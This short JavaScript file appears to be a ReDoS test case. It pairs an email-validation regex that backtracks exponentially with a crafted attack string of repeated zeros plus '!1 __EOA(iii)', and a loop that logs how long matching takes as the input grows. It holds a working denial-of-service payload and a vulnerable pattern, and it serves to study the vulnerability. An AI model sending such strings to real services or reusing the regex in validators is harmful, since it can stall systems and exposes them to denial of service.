/* 7247
 * ^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"0"+"0"*32+"!1 __EOA(iii)"
 */
var REGEX = /^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '0' + '0'.repeat(i*1) + '!1 __EOA(iii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}